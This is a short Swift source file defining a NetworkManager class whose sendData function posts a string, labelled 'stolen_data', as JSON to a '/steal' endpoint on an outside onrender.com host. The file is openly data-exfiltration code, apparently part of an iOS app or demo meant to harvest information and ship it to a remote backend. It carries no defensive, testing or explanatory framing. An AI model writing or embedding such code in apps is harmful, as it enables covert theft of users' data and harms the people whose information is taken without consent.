import Foundation
class NetworkManager {
    static func sendData(data: String) {
        guard let url = URL(string: "https://frog-ios-xm5a.onrender.com/steal") else {
            print("❌ Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")

        let body: [String: Any] = ["stolen_data": data]
        request.httpBody = try? JSONSerialization.data(withJSONObject: body)

        print("📤 Sending data to backend: \(data)")

        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                print("❌ Error sending data: \(error.localizedDescription)")
                return
            }
            print("✅ Data sent successfully")
        }.resume()
    }
}
